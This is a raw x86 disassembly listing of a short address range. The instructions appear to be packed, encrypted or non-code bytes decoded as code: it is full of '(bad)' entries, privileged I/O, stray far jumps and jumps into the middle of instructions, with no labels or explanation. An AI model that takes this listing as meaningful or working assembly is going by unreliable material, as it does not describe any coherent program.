  419bb1:	mov    dh,0x8e
  419bb3:	xor    esi,DWORD PTR [ecx]
  419bb5:	daa    
  419bb6:	iret   
  419bb7:	mov    esi,0xebbfdbdf
  419bbc:	leave  
  419bbd:	push   0xfffffff4
  419bbf:	sbb    bl,bh
  419bc1:	xchg   esp,eax
  419bc2:	shr    DWORD PTR [edi],1
  419bc4:	lahf   
  419bc5:	pushfw 
  419bc7:	(bad)  
  419bc8:	loop   0x419b55
  419bca:	aam    0x99
  419bcc:	adc    DWORD PTR [edx-0x48],ebx
  419bcf:	nop
  419bd0:	(bad)
  419bd4:	pushf  
  419bd5:	in     eax,dx
  419bd6:	jnp    0x419c57
  419bd8:	fs mov esi,0x91547ebb
  419bde:	je     0x419b9c
  419be0:	inc    esi
  419be1:	fsubr  DWORD PTR [esi+0x1d]
  419be4:	push   0x440fd9dd
  419be9:	ret    
  419bea:	mov    dh,0xce
  419bec:	xlat   BYTE PTR ds:[ebx]
  419bed:	hlt    
  419bee:	xor    eax,0x7fb9767b
  419bf3:	lods   al,BYTE PTR ds:[esi]
  419bf4:	test   eax,0xffd68c43
  419bf9:	sub    eax,0x2bd8b787
  419bfe:	adc    eax,0xec3208d6
  419c03:	test   DWORD PTR [ebx],0xbc9b5e3f
  419c09:	cmp    DWORD PTR [ebx],ebx
  419c0b:	mov    ebx,0xd2c61d2
  419c10:	(bad)  
  419c11:	ds aam 0xd0
  419c14:	pop    eax
  419c15:	clc    
  419c16:	in     al,0xa3
  419c18:	inc    ebp
  419c19:	ins    DWORD PTR es:[edi],dx
  419c1a:	dec    ecx
  419c1b:	add    DWORD PTR [ebp+edx*4+0x6c],edx
  419c1f:	fs adc eax,0xf76f5381
  419c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c26:	pop    ecx
  419c27:	push   esp
  419c28:	jmp    FWORD PTR [edi-0x6db4635c]
  419c2e:	mov    edi,0xc41280bf
  419c33:	cli    
  419c34:	loopne 0x419c91
  419c36:	push   ebp
  419c37:	gs mov edx,0xde8a23cb
  419c3d:	jae    0x419ca7
  419c3f:	mov    ebp,eax
  419c41:	data16 (bad) 
  419c43:	call   0x3ef1:0x51c8e189
  419c4a:	daa    
  419c4b:	out    dx,eax
  419c4c:	retf   
  419c4d:	nop
  419c4e:	push   es
  419c4f:	dec    ecx
  419c51:	xchg   edx,eax
  419c52:	jne    0x419cb3
  419c54:	ret    
  419c55:	call   0x6cf6cc10
  419c5a:	mov    ebp,0x7645c9f9
  419c5f:	and    BYTE PTR [edx+0x3f89411f],bh
  419c65:	cs es jge 0x419c15
  419c69:	rol    DWORD PTR [edi-0x48],1
  419c6c:	(bad)  
  419c6d:	sub    al,0x91
  419c6f:	adc    eax,0xe713e146
  419c74:	sub    BYTE PTR [edx-0x5],dh
  419c77:	pop    ebx
  419c78:	cmp    BYTE PTR [ebx],0x5d
  419c7b:	xchg   esi,eax
  419c7c:	in     al,0xa0
  419c7e:	fild   WORD PTR [edi-0xe]
  419c81:	ret    0xc9a5
  419c84:	test   eax,0xf06c7958
  419c89:	push   edi
  419c8a:	in     al,0x98
  419c8c:	dec    ecx
  419c8d:	or     DWORD PTR [esi],ebx
  419c8f:	and    eax,0xd4d27ec7
  419c94:	jl     0x419cf2
  419c96:	jp     0x419c2f
  419c98:	mov    ebx,ss
  419c9a:	ret    
  419c9b:	push   ss
  419c9c:	add    eax,0x559b40d4
  419ca1:	daa    
  419ca2:	sub    DWORD PTR [ecx+ecx*1+0x55],0x7f
  419ca7:	push   esi
  419ca8:	and    esp,DWORD PTR [ecx+0x77]
  419cab:	adc    al,BYTE PTR [esp+ebx*8]
  419cae:	loopne 0x419c61
  419cb0:	pop    ds
  419cb1:	adc    bl,ah
  419cb3:	xchg   ebx,eax
  419cb4:	cmp    al,0x21
  419cb6:	push   edi
  419cb7:	xchg   ebx,eax
  419cb8:	cld    
  419cb9:	int    0x81
  419cbb:	inc    esi
  419cbc:	adc    BYTE PTR [edx+0x45f0f758],ah
  419cc2:	inc    ebx
  419cc3:	je     0x419d0f
  419cc5:	mov    bl,0x13
  419cc7:	leave  
  419cc8:	xor    BYTE PTR [esi],cl
  419cca:	leave  
  419ccb:	mov    ecx,0x662e26e4
  419cd0:	inc    edx
  419cd1:	mov    eax,0xa8ad2c93
  419cd6:	push   eax
  419cd7:	mov    gs,WORD PTR [edi-0x5b0ee1c0]
  419cdd:	rcr    DWORD PTR [esi-0x47045a5f],1
  419ce3:	mov    cl,0x84
  419ce5:	jb     0x419d3d
  419ce7:	sbb    al,0xc3
  419ce9:	fdivr  DWORD PTR [ebp-0x639dc2ce]
  419cef:	pop    edi
  419cf0:	xchg   ebx,eax
  419cf1:	(bad)  
  419cf2:	les    ecx,FWORD PTR [edi-0x8]
  419cf5:	scas   eax,DWORD PTR es:[edi]
  419cf6:	dec    esp
  419cf7:	loope  0x419d75
  419cf9:	mov    WORD PTR [edi+0x378abfbd],es
  419cff:	shl    BYTE PTR [ecx-0x63],cl
  419d02:	gs imul esp,esp,0xffffffd8
  419d06:	and    bh,BYTE PTR [ecx]
  419d08:	mov    al,0x20
  419d0a:	add    bh,BYTE PTR ds:0x5beb21a7
  419d10:	pusha  
  419d11:	scas   al,BYTE PTR es:[edi]
  419d12:	aad    0x48
  419d14:	ja     0x419d14
  419d16:	and    al,0x42
  419d18:	sti    
  419d19:	and    DWORD PTR [ecx],esi
  419d1b:	or     BYTE PTR [ebx+0x179cd8c3],0xea
  419d22:	out    0x4f,al
  419d24:	(bad)  
  419d26:	in     al,0xa7
  419d28:	pop    esp
  419d29:	fild   QWORD PTR [eax-0x4274ce5c]
  419d2f:	stos   BYTE PTR es:[edi],al
  419d30:	icebp  
  419d31:	inc    esi
  419d32:	push   ds
  419d33:	(bad)
  419d37:	fsubr  DWORD PTR [edi]
  419d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d3a:	mov    esp,0x7ca099d7
  419d3f:	mov    cs,WORD PTR [edi]
  419d41:	paddsw mm3,QWORD PTR [eax]
  419d44:	add    DWORD PTR [ebp+0x1ec41e3a],ebp
  419d4a:	pop    es
  419d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d4c:	ins    BYTE PTR es:[edi],dx
  419d4d:	(bad)  
  419d4e:	pop    eax
  419d4f:	call   0x2f14e537
  419d54:	sub    ebx,DWORD PTR fs:[eax]
  419d57:	aad    0x7e
  419d59:	cmp    DWORD PTR [esi+edi*8+0x7],edx
  419d5d:	scas   al,BYTE PTR es:[edi]
  419d5e:	ror    DWORD PTR [ecx],cl
  419d60:	test   DWORD PTR [edi-0x57],edi
  419d63:	popa   
  419d64:	lds    edi,FWORD PTR [edi-0x318b816a]
  419d6a:	leave  
  419d6b:	shl    BYTE PTR [ebx],1
  419d6d:	dec    BYTE PTR [eax-0x4b8ef334]
  419d73:	aad    0xd0
  419d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d76:	fcomp  QWORD PTR [esp+ebp*2+0x76]
  419d7a:	mov    bl,0x40
  419d7c:	push   cs
  419d7d:	push   edi
  419d7e:	xor    cl,BYTE PTR [edi]
  419d80:	inc    esp
  419d81:	fnstenv [esi-0x2d98f86d]
  419d87:	int3   
  419d88:	popa   
  419d89:	add    dl,BYTE PTR [edi]
  419d8b:	mov    ds:0x209846df,eax
  419d90:	xchg   ebp,eax
  419d91:	sbb    eax,0x598c2ea1
  419d96:	fistp  QWORD PTR [esi-0x15]
  419d99:	mov    ebx,0xb5ca4f05
  419d9e:	dec    ecx
  419d9f:	adc    bh,BYTE PTR [ebx]
  419da1:	jmp    0x3af609f6
  419da6:	imul   esp,DWORD PTR [eax-0x3b],0x44
  419daa:	add    BYTE PTR [esi+eiz*1],bl
  419dad:	jl     0x419d31
  419daf:	arpl   si,si
  419db1:	cmp    eax,0xb2a4d573
  419db6:	or     ah,BYTE PTR [esi]
  419db8:	inc    esi
  419db9:	in     al,0xa1
  419dbb:	push   ebx
  419dbc:	xchg   ecx,eax
  419dbd:	in     eax,0xb4
  419dbf:	xchg   eax,ebx
  419dc1:	jbe    0x419df5
  419dc3:	cdq    
  419dc4:	in     eax,dx
  419dc5:	sahf   
  419dc6:	rol    BYTE PTR [edi],cl
  419dc8:	dec    esp
  419dc9:	fld    DWORD PTR [ebx]
  419dcb:	pop    eax
  419dcc:	pop    esp
  419dcd:	jmp    0x419d83
  419dcf:	inc    edx
  419dd0:	in     al,dx
  419dd1:	outs   dx,DWORD PTR ds:[esi]
  419dd2:	cmp    BYTE PTR [ecx],ch
  419dd4:	nop
  419dd5:	jle    0x419d7a
  419dd7:	mov    ebp,0xb0877a1d
  419ddc:	xchg   ebp,eax
  419ddd:	and    BYTE PTR [edx],ah
  419ddf:	jne    0x419e46
  419de1:	inc    ecx
  419de2:	sub    BYTE PTR fs:[edi+0x363f4d7a],dl
  419de9:	push   edx
  419dea:	fnstenv [esi]
  419dec:	inc    ecx
  419ded:	sbb    edx,DWORD PTR [ebx-0x5c]
  419df0:	ds push esi
  419df2:	js     0x419deb
  419df4:	add    eax,0x8fab9e61
  419df9:	mov    esp,0xfebc43c6
  419dfe:	dec    eax
  419dff:	xor    BYTE PTR [ebx],bh
  419e01:	push   ds
  419e02:	scas   al,BYTE PTR es:[edi]
  419e03:	inc    edx
  419e04:	into   
  419e05:	ror    DWORD PTR [ecx+0x5a1ed3bb],1
  419e0b:	lea    ebx,[ebx-0x8]
  419e0e:	repnz gs xor eax,0x6a83bf78
  419e15:	mov    dl,0x8c
  419e17:	sbb    al,0xea
  419e19:	ret    0xa5f1
  419e1c:	pop    es
  419e1d:	cwde   
  419e1e:	xchg   esi,eax
  419e1f:	(bad)  
  419e20:	(bad)  [eax-0x6a]
  419e23:	adc    al,0xa8
  419e25:	cmp    al,0xaa
  419e27:	out    0xa2,eax
  419e29:	adc    al,0xb
  419e2b:	sbb    al,0x7b
  419e2d:	out    dx,eax
  419e2e:	mov    DWORD PTR [ecx],ebx
  419e30:	mov    dl,0x86
  419e32:	xchg   ebx,eax
  419e33:	test   DWORD PTR [ebx],ebx
  419e35:	push   edi
  419e36:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e39:	stc    
  419e3a:	shr    DWORD PTR ds:0x3a14aa0d,1
  419e40:	push   ebx
  419e41:	cmp    bl,BYTE PTR [ebp-0xcf3cf93]
  419e47:	data16 and ax,0xde28
  419e4c:	adc    eax,0xeb3dd851
  419e51:	stc    
  419e52:	cmp    al,BYTE PTR [edi+0x42]
  419e55:	(bad)  
  419e57:	or     al,0x49
  419e59:	nop    eax
  419e5c:	push   0x2f
  419e5e:	aam    0xe
  419e60:	sahf   
  419e61:	fcom   DWORD PTR [ecx+0x498e14e2]
  419e67:	adc    ebx,DWORD PTR [edx]
  419e69:	dec    ebx
  419e6a:	test   al,0xb
  419e6c:	retf   0x8acf
  419e6f:	pop    esp
  419e70:	push   esi
  419e71:	(bad)
  419e74:	or     BYTE PTR [ebp+0x6e28e307],cl
  419e7a:	jae    0x419e37
  419e7c:	mov    ecx,0x1e3420b2
  419e81:	inc    eax
  419e82:	in     eax,dx
  419e83:	loope  0x419e34
  419e85:	push   0xad839fd6
  419e8a:	sbb    al,0xb2
  419e8c:	add    al,0xc1
  419e8e:	or     ecx,esi
  419e90:	mov    ebx,0xd024d779
  419e95:	cmc    
  419e96:	fisub  WORD PTR [ebx]
  419e98:	pop    ecx
  419e99:	dec    edx
  419e9a:	xchg   esi,eax
  419e9b:	gs and al,0x18
  419e9e:	test   eax,0x22f95cfb
  419ea3:	ja     0x419e86
  419ea5:	mov    esp,0xa3452b16
  419eaa:	mov    dl,0x3d
  419eac:	mov    edi,0xd9a458e6
  419eb1:	mov    dh,0x64
  419eb3:	dec    edi
  419eb4:	mov    edx,0x5e2efe05
  419eb9:	pusha  
  419eba:	aaa    
  419ebb:	fs push edx
  419ebd:	test   al,0xf7
  419ebf:	mov    ebx,0x2462b9fe
  419ec4:	int    0xc
  419ec6:	test   al,0xc9
  419ec8:	out    0x1,al
  419eca:	aam    0x6
  419ecc:	adc    dh,BYTE PTR [eax]
  419ece:	pop    es
  419ecf:	xchg   ecx,eax
  419ed0:	pop    es
  419ed1:	pop    ss
  419ed2:	jo     0x419e5d
  419ed4:	les    ebx,FWORD PTR [di+0x75]
  419ed8:	cwde   
  419ed9:	jecxz  0x419f09
  419edb:	lea    eax,[ecx]
  419edd:	test   BYTE PTR [ecx-0x57],cl
  419ee0:	dec    edi
  419ee1:	je     0x419e8a
  419ee3:	(bad)  
  419ee4:	jle    0x419e9b
  419ee6:	pop    eax
  419ee7:	aad    0xb4
  419ee9:	sbb    al,0x73
  419eeb:	in     eax,0x5b
  419eed:	or     al,0x20
  419eef:	xor    eax,0x76218d7a
  419ef4:	lahf   
  419ef5:	cli    
  419ef6:	or     eax,DWORD PTR [eax+0x33c2a9ce]
  419efc:	mov    ds:0x67ce6252,al
  419f01:	and    DWORD PTR [edx+0x28],0x98509559
  419f08:	add    dh,bh
  419f0a:	mov    bl,0xae
  419f0c:	imul   ebx,DWORD PTR [edx],0x5a57dff6
  419f12:	dec    edx
  419f13:	imul   ecx,DWORD PTR [eax],0xfffffffd
  419f16:	aam    0xf0
  419f18:	bound  esp,QWORD PTR [edi+0x39]
  419f1b:	and    eax,0x174f1f2f
  419f20:	mov    esi,0xf320bdbd
  419f25:	arpl   WORD PTR [ebx-0x637f7bb8],si
  419f2b:	push   edi
  419f2c:	ficomp WORD PTR ds:0x9a22c410
  419f32:	inc    eax
  419f33:	cmp    al,0x6d
  419f35:	inc    eax
  419f36:	arpl   WORD PTR [bx-0x6a7],ax
  419f3b:	das    
  419f3c:	mov    ecx,0x31cc0301
  419f41:	lahf   
  419f42:	ret    
  419f43:	jmp    0x128e486e
  419f48:	cs mov ch,0x46
  419f4b:	adc    al,0x42
  419f4d:	jbe    0x419f91
  419f4f:	sub    al,0x7b
  419f51:	push   ebp
  419f52:	sub    edx,DWORD PTR ds:0xfb6f3509
  419f58:	fiadd  DWORD PTR [edx+0x6a08ba1d]
  419f5e:	scas   eax,DWORD PTR es:[edi]
  419f5f:	xchg   ebp,eax
  419f60:	cmp    ebx,0xc59b3cb2
  419f66:	jge    0x419f2f
  419f68:	inc    esp
  419f69:	add    ah,bl
  419f6b:	xchg   edi,eax
  419f6c:	int3   
  419f6d:	mov    bh,0xe9
  419f6f:	cmp    edx,eax
  419f71:	xor    dl,BYTE PTR [ebx-0x3]
  419f74:	std    
  419f75:	fbld   TBYTE PTR ds:0xb0ff624c
  419f7b:	sar    BYTE PTR [edx],1
  419f7d:	mov    edi,0xaa675d9a
  419f82:	push   sp
  419f84:	adc    ebp,DWORD PTR [ebp-0x15d3f285]
  419f8a:	icebp  
  419f8b:	sub    al,0xf9
  419f8d:	or     DWORD PTR [edi],esi
  419f8f:	sbb    bh,ch
  419f91:	inc    eax
  419f92:	sub    DWORD PTR [ebx+0x7d],edi
  419f95:	sbb    eax,0x548a14d3
  419f9a:	xchg   esi,eax
  419f9b:	adc    ecx,ebx
  419f9d:	jp     0x419ff1
  419f9f:	jmp    0x7810:0xdeda7024
  419fa6:	mov    cl,BYTE PTR [edx]
  419fa8:	in     al,0x8c
  419faa:	inc    esi
  419fab:	jp     0x419fd5
  419fad:	dec    esi
  419fae:	jmp    0x3b2a:0x582d2c91
  419fb5:	test   BYTE PTR [edi],0xe0
  419fb8:	jo     0x419f48
  419fba:	add    ebp,DWORD PTR [ebp-0x6adf9b36]
  419fc0:	mov    al,ds:0x24cd5e1
  419fc5:	xchg   cl,bl
  419fc7:	cmp    al,dl
  419fc9:	iret   
  419fca:	inc    ebp
  419fcb:	in     al,dx
  419fcc:	int3   
  419fcd:	lods   eax,DWORD PTR ds:[esi]
  419fce:	push   eax
  419fcf:	ins    DWORD PTR es:[edi],dx
  419fd0:	pop    edx
  419fd1:	mov    ds:0x265e320b,eax
  419fd6:	pushf  
  419fd7:	adc    eax,0xadde5c30
  419fdc:	and    dh,BYTE PTR [edi+0x1b]
  419fdf:	pop    ecx
  419fe0:	ins    DWORD PTR es:[edi],dx
  419fe1:	and    ebx,ebp
  419fe3:	test   al,0x3f
  419fe5:	and    al,0x8c
  419fe7:	lock fimul WORD PTR [ebp+0x6387aef0]
  419fee:	inc    esi
  419fef:	in     eax,0x7d
  419ff1:	push   ds
  419ff2:	xchg   DWORD PTR [ebx],esi
  419ff4:	inc    esp
  419ff5:	mov    ds,WORD PTR [ebp-0x13]
  419ff8:	fdivrp st(2),st
  419ffa:	ins    DWORD PTR es:[edi],dx
  419ffb:	mov    eax,0xccd439fe
  41a000:	gs retf 0xe9cb
  41a004:	(bad)  
  41a005:	test   DWORD PTR [ecx],0xdf0e4976
  41a00b:	mov    ds:0xc0941419,al
  41a010:	fist   DWORD PTR [edx-0x70]
  41a013:	sbb    eax,DWORD PTR [edx+0xb1bd1e6]
  41a019:	jmp    0xb5e3920d
  41a01e:	adc    BYTE PTR [esi+0x20431127],0x61
  41a025:	push   ebp
  41a026:	mov    ecx,0xec1443d6
  41a02b:	aad    0xe6
  41a02d:	call   FWORD PTR ds:0xc17121b9
  41a033:	sbb    eax,0x435da9d4
  41a038:	dec    eax
  41a039:	rol    DWORD PTR [ecx+0x49],1
  41a03c:	and    esp,DWORD PTR [ebp+ecx*4-0x18]
  41a040:	xor    DWORD PTR [ecx-0x6e],0xffffff88
  41a044:	jae    0x41a007
  41a046:	dec    eax
  41a047:	adc    cl,dh
  41a049:	aam    0x4f
  41a04b:	outs   dx,DWORD PTR ds:[esi]
  41a04c:	sbb    al,0x5e
  41a04e:	xchg   DWORD PTR [eax],edx
  41a050:	jp     0x41a044
  41a052:	addr16 leave 
  41a054:	add    DWORD PTR [esi],ebp
  41a056:	les    ecx,FWORD PTR [eax+0x21]
  41a059:	mov    ah,0x2b
  41a05b:	test   eax,0x1ffc6a24
  41a060:	fadd   DWORD PTR ds:0x246e2f25
  41a066:	cld    
  41a067:	test   DWORD PTR [edx+0x5203cdc8],edx
  41a06d:	test   eax,0x3dc40bab
  41a072:	lods   al,BYTE PTR ds:[esi]
  41a073:	test   eax,0xb7441f66
  41a079:	cmp    bl,dl
  41a07b:	mov    edx,DWORD PTR [ebp+0x7a0b9e2d]
  41a081:	add    eax,0x8de44566
  41a086:	push   ds
  41a087:	mov    ds:0xd90ce2ab,eax
  41a08c:	sbb    eax,DWORD PTR [edi]
  41a08e:	cld    
  41a08f:	popf   
  41a090:	sbb    eax,0xa8f28127
  41a095:	sub    al,0x6c
  41a097:	inc    edx
  41a098:	scas   al,BYTE PTR es:[edi]
  41a099:	and    DWORD PTR [edx+0x80818dc],0xffffffed
  41a0a0:	mov    DWORD PTR [edi+edi*2-0x718ee5e8],ebx
  41a0a7:	sub    eax,0xddbb626
  41a0ac:	fbstp  TBYTE PTR ds:0x3b2c2d30
  41a0b2:	in     eax,0x87
  41a0b4:	pop    ebx
  41a0b5:	lahf   
  41a0b6:	jno    0x41a106
  41a0b8:	mov    ch,0x39
  41a0ba:	retf   
  41a0bb:	jb     0x41a109
  41a0bd:	aaa    
  41a0be:	add    al,0x11
  41a0c0:	pop    eax
  41a0c1:	inc    edx
  41a0c2:	lods   eax,DWORD PTR ds:[esi]
  41a0c3:	aad    0xe5
  41a0c5:	xchg   BYTE PTR [esi],dh
  41a0c7:	jno    0x41a122
  41a0c9:	lea    edi,[ebx]
  41a0cb:	(bad)  
  41a0cc:	mov    dh,0x96
  41a0ce:	neg    DWORD PTR [ebx-0x6fa0fe44]
  41a0d4:	add    esi,DWORD PTR [eax-0x56]
  41a0d7:	jmp    0xd3d5440e
  41a0dc:	paddusw mm7,mm2
  41a0df:	mov    edx,ebp
  41a0e1:	sti    
  41a0e2:	inc    ebx
  41a0e3:	jmp    0x6c13:0x9e74a922
  41a0ea:	or     dl,BYTE PTR [ebx-0x47b4e978]
  41a0f0:	(bad)  
  41a0f1:	fidivr DWORD PTR [ebp+0x21]
  41a0f4:	rcr    BYTE PTR [edx+0x62],cl
  41a0f7:	repnz sbb DWORD PTR [si-0x16],ebp
  41a0fc:	loope  0x41a107
  41a0fe:	dec    esp
  41a0ff:	sbb    eax,0xd25b918d
  41a104:	mov    bl,0xa4
  41a106:	cmp    ecx,DWORD PTR [edi+eax*2+0xa]
  41a10a:	xchg   esi,eax
  41a10b:	xor    ah,cl
  41a10d:	inc    eax
  41a10e:	pop    ss
  41a10f:	adc    BYTE PTR [edi-0x48],al
  41a112:	cs push esi
  41a114:	mov    eax,ds:0x97c8ecc3
  41a119:	jne    0x41a179
  41a11b:	push   0xffffff8e
  41a11d:	dec    ebp
  41a11e:	imul   edx,DWORD PTR [edx-0x60],0x2
  41a122:	xor    eax,0x17c0488e
  41a127:	add    BYTE PTR [esi-0x62ff160c],cl
  41a12d:	lock xlat BYTE PTR gs:[ebx]
  41a130:	push   ss
  41a131:	lods   al,BYTE PTR ds:[esi]
  41a132:	in     eax,0xdc
  41a134:	div    edx
  41a136:	add    edi,DWORD PTR [eax]
  41a138:	push   ecx
  41a139:	loope  0x41a195
  41a13b:	mov    WORD PTR [ebx-0x4d],fs
  41a13e:	jl     0x41a18a
  41a140:	inc    esi
  41a141:	out    0xf1,al
  41a143:	daa    
  41a144:	shr    DWORD PTR [edi+0x3729b387],cl
  41a14a:	xor    eax,DWORD PTR fs:[ebp-0x5c006ec0]
  41a151:	sbb    BYTE PTR ds:[edi-0x48],cl
  41a155:	rol    bh,cl
  41a157:	or     eax,0xac16425e
  41a15c:	mov    eax,ds:0xfb5fd281
  41a161:	xchg   ebp,eax
  41a162:	sbb    eax,0x8ff409ab
  41a167:	mov    ebp,?
  41a169:	jge    0x41a0ee
  41a16b:	in     eax,0xa9
  41a16d:	in     al,dx
  41a16e:	enter  0x22a0,0x63
  41a172:	bound  eax,QWORD PTR ds:0x91e220b2
  41a178:	into   
  41a179:	int3   
  41a17a:	invd   
  41a17c:	lahf   
  41a17d:	or     dl,BYTE PTR [edx]
  41a17f:	shl    BYTE PTR [ebp-0x42],cl
  41a182:	pslld  mm2,QWORD PTR [edi-0x48]
  41a186:	je     0x41a115
  41a188:	sbb    ch,BYTE PTR cs:[edi]
  41a18b:	psllq  mm2,QWORD PTR [esi]
  41a18e:	add    BYTE PTR [esi+0x271b7ae9],bh
  41a194:	mov    esp,0xeca0f837
  41a199:	jno    0x41a14c
  41a19b:	jl     0x41a1e2
  41a19d:	inc    esp
  41a19e:	stos   BYTE PTR es:[edi],al
  41a19f:	dec    edi
  41a1a0:	scas   al,BYTE PTR es:[edi]
  41a1a1:	js     0x41a1c3
  41a1a3:	repnz and eax,ebp
  41a1a6:	test   DWORD PTR [ecx-0x8d727b6],edx
  41a1ac:	push   ss
  41a1ad:	adc    BYTE PTR [ecx+esi*1-0x75],0x1a
  41a1b2:	xchg   edx,eax
  41a1b3:	inc    eax
  41a1b4:	or     BYTE PTR [ebp-0x5c],cl
  41a1b7:	xchg   BYTE PTR [eax+0x2a],cl
  41a1ba:	xchg   DWORD PTR [eax+0x6a94fa5d],esi
  41a1c0:	loopne 0x41a172
  41a1c2:	jle    0x41a162
  41a1c4:	mov    ah,0xea
  41a1c6:	ficomp WORD PTR fs:[edx-0x1]
  41a1ca:	mov    ecx,0xd439dc1b
  41a1cf:	inc    ebx
  41a1d0:	sbb    DWORD PTR [ecx-0xf],ebx
  41a1d3:	outs   dx,DWORD PTR ds:[esi]
  41a1d4:	dec    ebp
  41a1d5:	ret    
  41a1d6:	xchg   ecx,eax
  41a1d7:	mov    ebp,0xb026e7de
  41a1dc:	cli    
  41a1dd:	data16 xlat BYTE PTR ds:[bx]
  41a1e0:	xchg   edx,eax
  41a1e1:	shl    BYTE PTR [eax],cl
  41a1e3:	ss ds jnp 0x41a1bb
  41a1e7:	jge    0x41a1e7
  41a1e9:	not    DWORD PTR [edi+0x3824208c]
  41a1ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1f0:	push   cs
  41a1f1:	in     al,dx
  41a1f2:	jns    0x41a222
  41a1f4:	fdiv   QWORD PTR ds:0xd9dc6eac
  41a1fa:	in     al,dx
  41a1fb:	das    
  41a1fc:	mov    esi,0x72885a1a
  41a201:	lods   al,BYTE PTR ds:[esi]
  41a202:	retf   0x9d05
  41a205:	inc    edx
  41a206:	std    
  41a207:	xchg   esi,eax
  41a208:	mov    ebx,0xc6a2ab7f
  41a20d:	mov    dh,0x1b
  41a20f:	jns    0x41a25d
  41a211:	mov    ds:0x1e4d29a0,al
  41a216:	pop    eax
  41a217:	(bad)  
  41a218:	retf   0x5239
  41a21b:	push   eax
  41a21c:	xchg   ecx,eax
  41a21d:	mov    eax,0x628eb657
  41a222:	adc    al,0xaa
  41a224:	lds    edi,FWORD PTR [eax+0x32f97ea5]
  41a22a:	test   al,0x96
  41a22c:	mov    dl,ch
  41a22e:	jnp    0x41a287
  41a230:	xor    ecx,esi
  41a232:	cvtpi2ps xmm6,mm5
  41a235:	sbb    eax,0x7fb4ea4e
  41a23a:	in     al,0x2a
  41a23c:	je     0x41a23f
  41a23e:	ret    0xae50
  41a241:	les    eax,FWORD PTR [edi]
  41a243:	sub    eax,0x12c551ee
  41a248:	dec    ebp
  41a249:	std    
  41a24a:	jecxz  0x41a2ad
  41a24c:	test   eax,0x9aa7c6bc
  41a251:	pop    ebp
  41a252:	mov    bl,BYTE PTR [edx]
  41a254:	jns    0x41a2af
  41a256:	sbb    dh,BYTE PTR [edx-0x175d85c3]
  41a25c:	mov    eax,ds
  41a25e:	and    BYTE PTR [edx+ebx*8-0x36],0xee
  41a263:	cmp    esi,esp
  41a265:	mov    edi,0x9fb27597
  41a26a:	jo     0x41a2de
  41a26c:	int    0xe2
  41a26e:	aad    0xf3
  41a270:	and    esi,DWORD PTR [ecx-0xb]
  41a273:	xor    eax,0xe7355914
  41a278:	arpl   WORD PTR [eax+0x3],dx
  41a27b:	call   0x90d3ad29
  41a280:	or     eax,0x6da8dae9
  41a285:	sub    BYTE PTR [ebp+edi*2-0x3a],0xee
  41a28a:	ret    0xfd90
  41a28d:	fnstcw WORD PTR [esi+ebp*8+0x36b92879]
  41a294:	js     0x41a237
  41a296:	mov    dh,0xf5
  41a298:	ret    
  41a299:	ja     0x41a30d
  41a29b:	ds and al,0xd9
  41a29e:	add    BYTE PTR [esi-0x1],ah
  41a2a1:	arpl   WORD PTR [ecx+0x48],bp
  41a2a4:	mov    esi,0x9cbb1f73
  41a2a9:	fbld   TBYTE PTR [ecx-0x6cbd8a18]
  41a2af:	sti    
  41a2b0:	mov    esi,0x86d0b1fc
  41a2b5:	retf   0x2f15
  41a2b8:	jno    0x41a319
  41a2ba:	out    dx,al
  41a2bb:	in     eax,dx
  41a2bc:	sub    eax,0x563b2848
  41a2c1:	jb     0x41a306
  41a2c3:	push   edx
  41a2c4:	xchg   ebp,eax
  41a2c5:	jnp    0x41a2a5
  41a2c7:	or     BYTE PTR ds:0x620f7aec,cl
  41a2cd:	retf   0xe61d
  41a2d0:	dec    ecx
  41a2d1:	inc    edi
  41a2d2:	mov    ebx,0x40790d74
  41a2d7:	pop    ds
  41a2d8:	cmp    cl,BYTE PTR [esi-0x6b]
  41a2db:	inc    edi
  41a2dc:	sbb    eax,0x7391df07
  41a2e1:	sti    
  41a2e2:	fwait
  41a2e3:	aam    0xf1
  41a2e5:	inc    edi
  41a2e6:	or     DWORD PTR ds:0x7694445c,eax
  41a2ec:	cmp    BYTE PTR [ebx],bh
  41a2ee:	loop   0x41a347
  41a2f0:	cmp    ebp,edi
  41a2f2:	sti    
  41a2f3:	xlat   BYTE PTR ds:[ebx]
  41a2f4:	mov    al,ds:0xd0d26423
  41a2f9:	push   ss
  41a2fa:	lahf   
  41a2fb:	cmp    cl,BYTE PTR [esi+0x5e198ffb]
  41a301:	dec    esi
  41a302:	shl    DWORD PTR [edx-0x66881337],cl
  41a308:	and    DWORD PTR [edx+esi*4-0x4b],eax
  41a30c:	out    0x4,eax
  41a30e:	jp     0x41a297
  41a310:	push   edx
  41a311:	fcom   QWORD PTR [edx-0x59]
  41a314:	lds    esi,FWORD PTR [ecx]
  41a316:	xor    eax,0x2fa9d708
  41a31b:	adc    esi,ecx
  41a31d:	push   esp
  41a31e:	(bad)  
  41a31f:	lods   al,BYTE PTR ds:[esi]
  41a320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a321:	jecxz  0x41a2f3
  41a323:	dec    ecx
  41a324:	int3   
  41a325:	cmp    dl,dl
  41a327:	ss jmp 0x41a357
  41a32a:	push   ebx
  41a32b:	push   edi
  41a32c:	(bad)  
  41a32d:	(bad)  
  41a32e:	pop    edi
  41a32f:	jne    0x41a2e9
  41a331:	mov    eax,ds:0x2d0a4e97
  41a336:	cdq    
  41a337:	adc    eax,esi
  41a339:	mov    al,ds:0x451c4fd6
  41a33e:	mov    bh,0xf0
  41a340:	jge    0x41a3ba
  41a342:	cmp    eax,0x5055e0d8
  41a347:	dec    ecx
  41a348:	xchg   esp,eax
  41a349:	pop    ds
  41a34a:	jno    0x41a2fd
  41a34c:	bound  ebx,QWORD PTR [ebx]
  41a34e:	loope  0x41a311
  41a350:	sub    DWORD PTR [ebp+0xc],0x21d18993
  41a357:	repnz inc eax
  41a359:	inc    eax
  41a35a:	jb     0x41a3c9
  41a35c:	mov    bh,0xaf
  41a35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a35f:	addr16 xor eax,0x49de88a7
  41a365:	repz fisub DWORD PTR [ecx+eax*1-0xaf0d2eb]
  41a36d:	ret    
  41a36e:	xor    al,0x88
  41a370:	and    ch,BYTE PTR [edi-0xb964df1]
  41a376:	adc    ebp,edi
  41a378:	addr16 inc ebx
